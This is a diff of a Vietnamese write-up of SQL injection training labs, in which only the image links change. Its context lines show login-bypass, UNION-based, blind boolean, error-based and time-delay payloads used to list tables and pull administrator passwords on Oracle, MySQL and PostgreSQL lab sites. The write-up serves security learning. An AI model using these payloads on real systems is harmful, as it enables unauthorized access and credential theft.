@@ -7,7 +7,7 @@ Yêu cầu của lab là thực hiện sqli để hiện ra sản phẩm bị �
 
 Khi vào trang web ấn chọn loại hàng ta sẽ thấy như sau.
 
-![image-1](https://gist.github.com/user-attachments/assets/42263577-6dc1-4437-a14a-4793c5b9981f)
+![Image](https://github.com/user-attachments/assets/ca3fcb95-31cf-48c1-a8f8-3f3007cc896b)
 
 Loại hàng mà ta chọn được đưa vào param ?category= tương ứng với câu query ở trên.<br>
 
@@ -17,7 +17,7 @@ Theo như logi câu query ở trên thì loại hàng đó phải được relea
 
 Vậy thì ta sẽ làm cho vế đằng sau AND trở thành luôn đúng.
 
-![image-2](https://gist.github.com/user-attachments/assets/a1ddb223-5959-4f5c-b0ed-6ad19cb5a6ec)
+![Image](https://github.com/user-attachments/assets/96af1a19-8177-4874-bdd9-9c5d9852e831)
 
 Sử dụng toán tử logic thì câu query sẽ trở thành.
 
@@ -28,7 +28,7 @@ Lúc này ta sẽ escape được category và để cho một điều kiện lo
 
 ## Lab: SQL injection vulnerability allowing login bypass
 
-![image-3](https://gist.github.com/user-attachments/assets/be91311b-0f7a-4690-a32c-f8851fcd22ff)
+![Image](https://github.com/user-attachments/assets/6ad0cc86-e3c2-4ee8-b292-dcf5e554c333)
 
 Yêu cầu lần này là đăng nhập bằng user **administrator** thông qua sqli.
 
@@ -42,20 +42,20 @@ Nên payload của ta sẽ như sau: `administrator' -- -`<br>
 Lúc này câu query sẽ như sau: `SELECT * FROM users WHERE username='administrator'-- - AND password='conmeo'`
 
 Phần sau admin sẽ bị bỏ qua
-![image-4](https://gist.github.com/user-attachments/assets/09276578-d4d8-4b46-8ba9-86739319e864)
+![Image](https://github.com/user-attachments/assets/9fd22666-e308-48ee-bbaf-69407576696b)
 
 
 ## Lab: SQL injection attack, querying the database type and version on Oracle
 
-![image-5](https://gist.github.com/user-attachments/assets/4144f987-835b-4c06-9c1a-437178acbe20)
+![Image](https://github.com/user-attachments/assets/24cb7381-d809-411e-854e-d521d80d1592)
 
 Bài này ta sẽ dùng union-based để tấn công sqli trên database oracle
 
-![image-6](https://gist.github.com/user-attachments/assets/12f0ae76-813e-4afb-9a52-8da69fa035f3)
+![Image](https://github.com/user-attachments/assets/ca644fcd-6c26-401b-9a0c-b8b98082f5fc)
 
 Tuy nhiên khi mình thử dùng hàm version của Oracle thì bị lỗi internal, dù vậy khi dựa vào đây ta cũng có thể biết được rằng dựa vào error này để biết câu query có hợp lệ hay không.<br>
 
-![image-7](https://gist.github.com/user-attachments/assets/503a122b-9bb6-49e0-a7b4-7b1d5b7bfef0)
+![Image](https://github.com/user-attachments/assets/2e569413-90c4-48b5-86f5-c932c5ab1df1)
 
 Sau khi hỏi chatGPT thì biết được rằng, trong Oracle ta không thể select một function như bên MySQL mà không có vế `from` được.<br>
 
@@ -68,25 +68,25 @@ Từ đó bảng **DUAL** được tạo ra để giải quyết vấn về này
 
 Quay trở lại theo như **UNION-based SQLi** thì đầu tiên ta phải xác định được số cột mà bảng trả về có thể là dùng **order by** hoặc cứ **select** dần cho đủ số cột như cách làm sau đây:
 
-![image-8](https://gist.github.com/user-attachments/assets/cc1efa14-1f32-4e56-9362-5b762e316ebf)
+![Image](https://github.com/user-attachments/assets/746a790e-117a-4388-827a-beb27e9117d3)
 
 Thử một cột **abc** thì chưa được, tuy nhiên sau khi thêm một cột nữa lại ok
 
-![image-9](https://gist.github.com/user-attachments/assets/8b2f553f-a248-4dd4-aaf3-a6f53698bb8c)
+![Image](https://github.com/user-attachments/assets/01b5667c-e136-4f41-a0cb-66130b3c1cac)
 
 Dựa vào đây ta biết được rằng kết quả query sẽ được in lên màn hình, có một số trường hợp nếu không thấy lỗi nữa mà vẫn không thấy có gì in ra thì ta nên check trong BurpSuite.
 
 Với ý tưởng đó mình lại đi thử tấn công theo cách thông thường trong mysql như sau 
 
-![image-10](https://gist.github.com/user-attachments/assets/20371248-102e-4f9c-9ba5-c940bb37bafa)
+![Image](https://github.com/user-attachments/assets/ee71a1f7-0e0e-47da-a4d7-49b5a79ccf36)
 
 Thì vẫn không được, không biết rằng version của Oracle có khác gì của MySQL không mình tìm hiểu thử
 
-![image-11](https://gist.github.com/user-attachments/assets/968164d9-404d-4cd1-af99-6d65742bbbd5)
+![Image](https://github.com/user-attachments/assets/2cb996de-5ce6-44c6-b04c-de6514407621)
 
 Sau khi tìm hiểu thì version của Oracle nó giống như một table hơn
 
-![image-12](https://gist.github.com/user-attachments/assets/9d2cd4fc-01ee-4a24-9760-5eea50486a99)
+![Image](https://github.com/user-attachments/assets/88a3ee0d-a2f7-480e-b1f6-c47d1982d020)
 
 Đọc thêm [tại đây](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/V-VERSION.html) 
 
@@ -99,33 +99,33 @@ Dựa vào đó ta lại tiếp tục khai thác, dư kiện hiện tại như s
 Cuối cùng ta đã khai thác thành công
 
 
-![image-13](https://gist.github.com/user-attachments/assets/7a92fb65-3658-4ae7-88fc-538dd4d8a719)
+![Image](https://github.com/user-attachments/assets/f9cb217f-5a8f-4b22-b831-099441ddedda)
 
-![image-14](https://gist.github.com/user-attachments/assets/c14a3f98-4b58-417c-a0e8-57c5c760d8e5)
+![Image](https://github.com/user-attachments/assets/7ef635c9-2e1f-4cb0-8cdf-3ada5de80c02)
 
-![image-15](https://gist.github.com/user-attachments/assets/7264ad00-eda7-4cbd-8c75-f415772ac849)
+![Image](https://github.com/user-attachments/assets/03cebfc5-0760-49d0-872f-3bee03f8602d)
 
 Câu query của ta như sau:`'union select NULL,BANNER from v$version -- -`
 
 ## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-![image-16](https://gist.github.com/user-attachments/assets/a4adc14a-1819-48d6-b452-053bcaedec64)
+![Image](https://github.com/user-attachments/assets/92ec7c9b-e3fc-4ab2-8acf-0d762e37f4e1)
 
 Yêu cầu của bài này y hệt bài ở trên tuy nhiên về MySQL thì mình quen hơn Oracle, vì vậy cũng như ý tưởng ở bài trên mình sẽ bắt đầu khai thác
 
-![image-17](https://gist.github.com/user-attachments/assets/3270d2da-34d8-4d6d-b46a-0664c86aaf7e)
+![Image](https://github.com/user-attachments/assets/6cebfbdb-7e2b-42ae-b34e-3c99520873b6)
 
-![image-19](https://gist.github.com/user-attachments/assets/de78c182-4555-48a8-ae4e-e9cf7c5c9507)
+![Image](https://github.com/user-attachments/assets/5cc4bfe2-ca68-4675-846f-4cccd5338c7f)
 
 Ở bài này mình sẽ sử dụng order by để tìm số cột, chẳng hạn như thay số cột thành 3 thì sẽ bị lỗi
 
-![image-18](https://gist.github.com/user-attachments/assets/fa2adc58-1a40-4326-9c34-810511cc8c70)
+![Image](https://github.com/user-attachments/assets/93fac2bb-3ed4-4e71-bcd5-432c0decc923)
 
 Tiếp đó là tìm version thôi
 
-![image-21](https://gist.github.com/user-attachments/assets/a504ced0-40cf-4997-82bd-b8296863b708)
+![Image](https://github.com/user-attachments/assets/1a27ae1e-8da4-4b94-b5bf-a58d805fa128)
 
-![image-20](https://gist.github.com/user-attachments/assets/c1cfcc0f-c3ce-4d8a-9f83-a8d5c1d5f703)
+![Image](https://github.com/user-attachments/assets/10226310-d01e-4f7f-89f2-6e2d639499e9)
 
 Về căn bản bài này khai thác bằng MySQL cần ít kiến thức hơn Oracle 
 
@@ -133,31 +133,31 @@ Payload: `' union select NULL,version() -- -`
 
 ## Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
-![image-22](https://gist.github.com/user-attachments/assets/553e2c4f-3be9-4aed-9ca0-fdf803e1d17c)
+![Image](https://github.com/user-attachments/assets/d488c5aa-1e7b-4bc3-91f8-02bee2936734)
 
 Với UNION-based thì đầu tiên mình vẫn sẽ đi tìm số cột
 
-![image-23](https://gist.github.com/user-attachments/assets/28da07fa-2373-4749-b1e7-e5eebf7aa749)
+![Image](https://github.com/user-attachments/assets/c0735ffb-a0a1-49b7-bb13-b5b41d68eda3)
 
 Payload:`' union select NULL,version() -- -`
 
 Xác định được số cột là 2, tiếp đến là xác định các table có trong bảng và tìm table có dạng users
 
-![image-24](https://gist.github.com/user-attachments/assets/cce2ab29-cb52-440f-b277-6742e3bf0999)
+![Image](https://github.com/user-attachments/assets/b1416477-679b-48c2-8a2a-e3b79dee7ccc)
 
-![image-25](https://gist.github.com/user-attachments/assets/4cc1b090-a74d-46e2-abed-0a6fce6c45f5)
+![Image](https://github.com/user-attachments/assets/e5e93dfa-6360-43b4-b0d0-b9d49b8ec5de)
 
 Payload:`' union select NULL, table_name from information_schema.tables -- -`
 
 Tiếp đó tìm lần lượt đến các cột trong bảng users
 
-![image-26](https://gist.github.com/user-attachments/assets/3fb169a7-aa8d-4664-980c-7d628d1674a0)
+![Image](https://github.com/user-attachments/assets/cda1c0eb-f17e-4be5-951c-ef6ee92a3bda)
 
 Payload:`' union select NULL,column_name from information_schema.columns where table_name = 'users_pjzcyr' -- -`
 
 Sau đó từ 2 cột này ta sẽ lấy thông tin của tất cả user có trong bảng
 
-![image-27](https://gist.github.com/user-attachments/assets/aeceb599-59c9-41a4-9480-1c0f85d182c9)
+![Image](https://github.com/user-attachments/assets/8bd5f200-e6a9-4c28-8985-b427f8ace477)
 
 Payload: `union select username_yvexiw, password_vgbnsx from users_pjzcyr -- -`
 
@@ -168,15 +168,15 @@ Câu này tương tự câu trên chỉ đổi database thôi
 
 Số cột vẫn là 2
 
-![image-28](https://gist.github.com/user-attachments/assets/528144c5-b9ce-4456-9e57-cc3a5e373418)
+![Image](https://github.com/user-attachments/assets/db28e611-64f7-4090-95c0-87a78c4e7e3d)
 
 Payload:`' order by 2 -- -`
 
 Mình đã thử tìm tên table như cách dùng với MySQL tuy nhiên không thành công, sau đó mình đã tìm hiểu và biết được rằng **information_schema** trong Oracle không chứa table_name mà là bẳng ALL_TABLES, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/55037468/oracle-equivalent-of-information-schema-tables), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)
 
-![image-29](https://gist.github.com/user-attachments/assets/704c1cf3-8c50-473a-8325-986d15828b51)
+![Image](https://github.com/user-attachments/assets/d9c446c3-f945-422e-83bb-3082ab8db6b7)
 
-![image-30](https://gist.github.com/user-attachments/assets/020baf9b-f092-41fc-9ed9-25c86946621c)
+![Image](https://github.com/user-attachments/assets/35622b73-0173-4b79-8d9e-8591cf3a7e76)
 
 Payload:`'union select NULL, table_name from all_tables -- -`
 
@@ -184,27 +184,27 @@ Tìm ra table trong database tiếp theo tìm ra database và cột thôi
 
 Không như MySQL Oracle không chứa **column_name** trong **information_schema** mà chứa trong **all_tab_columns**, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/8739203/oracle-query-to-fetch-column-names), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)
 
-![image-32](https://gist.github.com/user-attachments/assets/37ac0c64-27c9-4d2c-8025-c79fff4a3c13)
+![Image](https://github.com/user-attachments/assets/9a30c8f4-a2ce-4040-a704-c75f2f1b7357)
 
-![image-31](https://gist.github.com/user-attachments/assets/7fe1732e-bf64-428b-a64f-516ec110421b)
+![Image](https://github.com/user-attachments/assets/9830b3a3-f406-4ab7-bcb9-3312647ab88c)
 
 Payload:`' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_SUDJWQ' -- -`
 
-![image-33](https://gist.github.com/user-attachments/assets/60efd9ee-808e-4048-9ca6-c6ec0e821251)
+![Image](https://github.com/user-attachments/assets/1435ed25-3cff-40c1-9c49-5bf2eb61dee9)
 
 Payload:`'UNION SELECT USERNAME_DGFUYS,PASSWORD_BUIFQE FROM USERS_AKIBVQ -- -`
 
 ## Lab: Blind SQL injection with conditional responses
 
-![image-34](https://gist.github.com/user-attachments/assets/6f0315b0-1c05-42af-b567-1962038acaa0)
+![Image](https://github.com/user-attachments/assets/339a6ba9-908e-41df-89bc-1ed84a6995f3)
 
 Bài này thì SQL sẽ nằm trong trường cookie, nếu như có trả về gì đó thì trang sẽ hiện ra chữ Welcome Back.
 
-![image-35](https://gist.github.com/user-attachments/assets/207e577b-e0a2-452e-81d3-dbfefa4d8d5c)
+![Image](https://github.com/user-attachments/assets/d7fc9c31-c70a-43df-8bf6-2847b0e4653d)
 
 Nếu thay 1=2 thì sẽ không có
 
-![image-36](https://gist.github.com/user-attachments/assets/79f4dea5-2de5-418b-b077-efea98517ff3)
+![Image](https://github.com/user-attachments/assets/dccbb0dc-9888-4b7f-ac5e-27892b8dd4c4)
 
 Thì sau khi mình mò một hồi mình nhận ra rằng lí do tất cả nhưng câu query không hoạt động là do thiếu vế **AND** bởi vì **or 1=1** hay **or 1=2** sẽ luôn trả về 1 vế luôn đúng hoặc sai nên mới nhận được welcome.
 
@@ -220,11 +220,12 @@ Payload:`' and (select 'a' from users limit 1)='a' --`
 
 Payload có nghĩa là select kí tự a trong bảng user tuy nhiên đây chỉ là để kiểm tra xem bảng users có tồn tại hay không và so sánh với kí tự a để kiểm tra điều đó
 
-![image-37](https://gist.github.com/user-attachments/assets/55be0385-ef12-48bd-b994-04588c11a905)
+![Image](https://github.com/user-attachments/assets/135f19be-1bea-4ba5-9b50-6bf474fcee9a)
+
 
 Đây là th sai nên không thấy welcome giờ sẽ thử th đúng
 
-![image-38](https://gist.github.com/user-attachments/assets/6ed6787b-9832-42bc-955c-d228eeb1f0a1)
+![Image](https://github.com/user-attachments/assets/666989ea-ae36-48ce-a8b1-afd5a1aa7831)
 
 Bây giờ với ý tưởng như vậy ta sẽ tiếp tục tìm tài khoản admin và password
 
@@ -232,7 +233,7 @@ Payload: `' aNd (select 'a' from users WHERE username='administrator')='a'--`
 
 Trường hợp có admin
 
-![image-39](https://gist.github.com/user-attachments/assets/843d88c8-2f30-4e6e-beb3-dca57d4d9d30)
+![Image](https://github.com/user-attachments/assets/1d6eeb51-783a-4c83-803b-8378f036015d)
 
 Sau khi xác định có bảng users và tài khoản admin, tiếp theo ta sẽ kiểm tra độ dài của password để tí nữa bruteforce
 
@@ -240,38 +241,38 @@ Payload:`' and (select 'a' from users where username='administrator' and LENGTH(
 
 Trường hợp thử length pass lớn hơn 1, sau đó cứ bruteforce dấu = ta sẽ có pass length = 20
 
-![image-40](https://gist.github.com/user-attachments/assets/3ffa8691-66bb-48b6-ad20-ff7614887768)
+![Image](https://github.com/user-attachments/assets/c7aa0a89-da56-4a88-9086-15b5df9afcd2)
 
 Tiếp theo ta sẽ bruteforce pass = intruder với payload
 
 Payload:`' and (select SUBSTRING(password,1,1) from users where username='administrator')='a' --`
 
-![image-41](https://gist.github.com/user-attachments/assets/e1454650-3286-47dd-81a8-05e3dede8cdb)
+![Image](https://github.com/user-attachments/assets/8854e83b-be01-442c-bc5e-afe5a566451f)
 
 Vậy là ta đã biết kí tự đầu tiên của pass là chữ z 
 
 Giải thích thêm hàm SUBSTRING là lấy trong password kí tự đầu tiên và độ dài là 1, tuyến tính như vậy sẽ full 
 
-![image-42](https://gist.github.com/user-attachments/assets/829575e5-2bc5-4472-8251-484705328eee)
+![Image](https://github.com/user-attachments/assets/c0be7805-22a3-4b44-b2c6-5e92480aa645)
 
 20 kí tự này sẽ là pass: **zjlf82gpvassmldrvwyq**
 
-![image-43](https://gist.github.com/user-attachments/assets/fb6a32a1-a622-4ca2-95d3-d819f424cd8a)
+![Image](https://github.com/user-attachments/assets/fd829bf7-1c2e-4f56-883d-3db620fa475f)
 
 
 ## Lab: Blind SQL injection with conditional errors
 
-![image-44](https://gist.github.com/user-attachments/assets/c060202a-f614-40df-994d-62f0102e04bb)
+![Image](https://github.com/user-attachments/assets/37a4cc44-2cec-4259-9d4f-7f3766b90d93)
 
 Lab này ta sẽ dựa theo error của web để nhận biết
 
-![image-45](https://gist.github.com/user-attachments/assets/02e97fab-d5cf-40fd-b40f-d9c1a3bcbc34)
+![Image](https://github.com/user-attachments/assets/006506d9-4278-4608-a1b5-a112e88b6a58)
 
 ta dễ dàng thấy được rằng khi có dấu nháy vào thì câu query sẽ không được hoàn chỉnh và bị lỗi, **tiếp theo mình sẽ không kéo xuống dưới để xem nữa mà dựa vào độ dài của response để biết là có lỗi hay không**
 
 Sau đó mình thử cho thêm 1 cặp dấu nháy vào và thấy hết lỗi
 
-![image-46](https://gist.github.com/user-attachments/assets/c46859d9-784d-4124-81de-afeabaa3b179)
+![Image](https://github.com/user-attachments/assets/09ec03c6-2f48-4cd9-99f7-f5673951193e)
 
 
 Ý tưởng tiếp theo sẽ là thực hiện 1 câu query bên trong dấu ngoặc này để kiểm tra xem có lỗi hay không
@@ -281,23 +282,23 @@ Payload:`'||(SELECT '' FROM dual)||'`
 
 Với payload này nếu thực hiện đúng xong thì dấu nháy sẽ được nối lại nếu sai thì sẽ bị lỗi nên để kiểm tra khá tốt
 
-![image-47](https://gist.github.com/user-attachments/assets/1288b09c-19f1-4384-be3d-869197b97383)
+![Image](https://github.com/user-attachments/assets/c2cc7987-613c-4550-b5d8-024030219966)
 
 Bây giờ với kiểu **select 'a'** như bài trên ta bắt đầu kiểm tra bảng và user có tồn tại hay không
 
 Payload: `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
 
-![image-48](https://gist.github.com/user-attachments/assets/f1a67767-698c-4256-9130-8761cc75ff89)
+![Image](https://github.com/user-attachments/assets/6e13dd77-ac15-4a64-b7e5-75fd7cf89dd0)
 
 Phần **Rownum** sẽ giống như **Limit** bên SQL, thử th bảng không tồn tại thế nào
 
-![image-49](https://gist.github.com/user-attachments/assets/4d977771-fa0b-44e1-a534-32bc7baf3879)
+![Image](https://github.com/user-attachments/assets/14cdae65-a2d1-42cf-baef-6e13e89eea5a)
 
 Tiếp theo sẽ thử đến user admin
 
 Payload:`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-![image-51](https://gist.github.com/user-attachments/assets/5d934a22-e1f7-481c-b859-2edec9efe67a)
+![Image](https://github.com/user-attachments/assets/5affc344-2222-4f71-95a1-8762053daebd)
 
 Kiểm tra xem user admin có tồn tại hay không
 
@@ -307,7 +308,7 @@ Tiếp theo sẽ tiếp tục kiểm tra độ dài của pass
 
 Payload:`'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-![image-52](https://gist.github.com/user-attachments/assets/e52e80e4-738a-4776-a9cb-bd574223cd3a)
+![Image](https://github.com/user-attachments/assets/2151c221-eb24-40ec-8c1c-e9a769c1a914)
 
 
 Độ dài pass vẫn là 20 như bài trước 
@@ -316,29 +317,29 @@ Tiếp theo lại bruteforce pass
 
 Payload:`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-![image-53](https://gist.github.com/user-attachments/assets/9f1a7e52-6ae8-48d8-a36d-9e42a58316a2)
+![Image](https://github.com/user-attachments/assets/c23e5557-f149-4c92-9dad-7bd0162b3409)
 
 Chữ cái đầu tiên là **x** tiếp tục bruteforce cho đủ
 
-![image-54](https://gist.github.com/user-attachments/assets/5d88db70-12f5-4546-9abc-cc8f5f92729d)
+![Image](https://github.com/user-attachments/assets/69725d1c-4578-4a46-a278-07bc86df2385)
 
-![image-55](https://gist.github.com/user-attachments/assets/39b7293c-a529-48d2-a3cc-04805ba04bcb)
+![Image](https://github.com/user-attachments/assets/8829012c-9e74-42bd-ac6e-74ab0ab53776)
 
 Password là 20 kí tự này: **xdnuq2j4hvstdtwhv6z6**
 
 ## Lab: Visible error-based SQL injection
 
-![image-57](https://gist.github.com/user-attachments/assets/6eb1e909-084d-40c1-97dc-40f54077a0d6)
+![Image](https://github.com/user-attachments/assets/aee33852-71ad-4016-9cdc-72f50fd064d1)
 
 Ở lab này eror sẽ được throw thẳng ra từ web, nếu câu query sai
 
-![image-56](https://gist.github.com/user-attachments/assets/8897b9c7-a111-4042-8b44-4322c372de4e)
+![Image](https://github.com/user-attachments/assets/b4c40f73-fde5-439d-bab4-c94cd6ca1ecb)
 
 Ta sẽ dùng **CAST** trong mysql để check error - CAST sẽ đổi giá trị trả về thành kiểu dữ liệu bất kì, ý tưởng là sẽ dùng cast để nó throw error ra khi kiểu dữ liệu không phù hợp
 
 Payload:`' AND CAST((SELECT 1) AS int)--`
 
-![image-58](https://gist.github.com/user-attachments/assets/fca339d1-0a19-4df2-811d-c31bdc284b7b)
+![Image](https://github.com/user-attachments/assets/71effa43-dab0-4c76-ab92-e97102c7932a)
 
 Mình sẽ thử thêm 1 vào để nhầm lẫn input luôn là boolean
 
@@ -350,12 +351,12 @@ Payload:`' AND 1=CAST((SELECT username from users) AS int)--`
 
 Khi mình thử payload này thì thấy rằng nó bị lỗi độ dài
 
-![image-59](https://gist.github.com/user-attachments/assets/4aa95570-0fa0-4c76-a327-eba8da607be3)
+![Image](https://github.com/user-attachments/assets/99b7f428-2af7-47fc-8f14-b3f95c19aae5)
 
 Phần int đã bị mất
 
 
-![image-60](https://gist.github.com/user-attachments/assets/88b81f1a-2883-4b39-9ec4-beed989e2ef5)
+![Image](https://github.com/user-attachments/assets/789b41ce-917d-4302-8c80-0bc45a556ff9)
 
 Payload:`' AND 1=CAST((SELECT username from users limit 1) AS int)--`
 
@@ -363,22 +364,22 @@ Do câu query trả về không được quá 1 dòng nên mình đã limit lạ
 
 Làm tương tự lấy được pass
 
-![image-61](https://gist.github.com/user-attachments/assets/d720de18-e88e-4248-b5af-60f4deae0f4d)
+![Image](https://github.com/user-attachments/assets/e1c371da-5968-4320-97af-25f48f8642a8)
 
 
 ## Lab: Blind SQL injection with time delays and information retrieval
 
-![image-62](https://gist.github.com/user-attachments/assets/60b687e0-833c-4b6d-9520-35af21971501)
+![Image](https://github.com/user-attachments/assets/0e9bb615-32fd-4a5d-bdf5-846da3225b73)
 
 Bài này ta sẽ dùng time delay để xác định đúng sai, về mặc ý tưởng ý hệt conditional responses chỉ khác về cách nhận biết 1 cái dùng thời gian 1 cái dùng sự thay đổi của trang.
 
-![image-63](https://gist.github.com/user-attachments/assets/f81da95b-6fc1-484b-a424-c1de2e27da24)
+![Image](https://github.com/user-attachments/assets/bb9b6de0-9c0b-4b45-a457-243ecc3f7da9)
 
 Payload:`' || pg_sleep(3) -- -`
 
 Về payload này đầu tiên ta sẽ thoát chuỗi query sau đó nối dài câu query bằng toán tử concat **||** và **sleep** tùy thuộc vào database mà sử dụng concat và sleep khác nhau, sau khi thực thi thì thấy response bị chậm 3s, thử với 5s
 
-![image-64](https://gist.github.com/user-attachments/assets/0078012f-cfd0-40ef-9026-9b0767e2b20f)
+![Image](https://github.com/user-attachments/assets/a93b67a9-fdd4-4c61-b4f3-6a1ac9704d5b)
 
 Tiếp theo các bước vẫn như cũ tìm kiếm table, user, pass
 
@@ -386,33 +387,33 @@ Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM u
 
 Trường hợp có bảng users
 
-![image-65](https://gist.github.com/user-attachments/assets/e1cfa48b-47f3-4f65-bc58-747882c2dc38)
+![Image](https://github.com/user-attachments/assets/dc654061-20da-4f6a-a1d4-90a4272115f2)
 
 Ta thử một bảng không có xem sao
 
-![image-66](https://gist.github.com/user-attachments/assets/76259da7-eed9-4c05-a325-761901e7911b)
+![Image](https://github.com/user-attachments/assets/66d69ed3-fc46-46ed-be21-3da13ea2ac58)
 
 Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- -`
 
-![image-67](https://gist.github.com/user-attachments/assets/548f2836-877c-499b-8524-3689e5609ddf)
+![Image](https://github.com/user-attachments/assets/bb200dbf-e1b5-447c-8481-2fc88343ec3f)
 
 Tìm độ dài pass
 
 Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password)=20) -- -`
 
-![image-68](https://gist.github.com/user-attachments/assets/e2222a73-ef82-4440-ae52-65ee4a2b3d8f)
+![Image](https://github.com/user-attachments/assets/5d0b3f76-7340-4b06-8fbe-7a53ae8f1d79)
 
 Sau đó vẫn như các bài trên tìm password
 
 Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1)='a') -- -`
 
-![image-69](https://gist.github.com/user-attachments/assets/b3446134-1cc4-406d-9879-b35a8e6652be)
+![Image](https://github.com/user-attachments/assets/90868f1b-c70c-46b5-ad0d-dd95ae6f65e4)
 
 Chữ cái đầu là số 3, cứ vậy tiếp tục tìm các chữ cái còn lại
 
-![image-70](https://gist.github.com/user-attachments/assets/50921af9-5cbe-4672-930d-8df0847d815b)
+![Image](https://github.com/user-attachments/assets/5f0786f4-ae2f-4aee-985a-7266f5972113)
 
 
 Password:**3qgwyp0g9bdncslnerut**
 
-![image-71](https://gist.github.com/user-attachments/assets/d75f7545-72aa-4692-a40d-4d3ca5ee6858)
+![Image](https://github.com/user-attachments/assets/57aff20e-59a2-4cc8-9ed9-19204ae54645)
